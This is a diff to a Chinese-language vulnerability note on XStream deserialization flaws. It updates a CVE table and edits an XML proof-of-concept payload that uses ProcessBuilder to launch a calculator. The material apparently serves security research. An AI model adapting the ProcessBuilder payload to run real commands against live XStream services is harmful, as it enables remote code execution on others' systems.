@@ -2,10 +2,10 @@
 
 当用户可控的输入直接作为xstream.fromXML(xml)的参数时，可能导致反序列化漏洞，目前为止涉及的cve如下：
 
-
 |CVE ID |	PoC           |desc| 
 | ---- | ---- | ---- | 
-|CVE-2013-7285  | | <= 1.4.6|
+|CVE-2013-7285  |RCE | <= 1.4.6|
+|CVE-2019-10173 |RCE | <= 1.4.10|
 |CVE-2021-39139	| RCE           | JDK版本要在7u21及以下 |
 |CVE-2021-39140	| DoS           |        |
 |CVE-2021-39141	| JNDI Based RCE|        |
@@ -36,7 +36,7 @@ poc:
             <target class="java.lang.ProcessBuilder">
                 <command>
                     <string>open</string>
-                    <string>/Applications/Calculator.app</string>
+                    <string>calc</string>
                 </command>
             </target>
             <action>start</action>
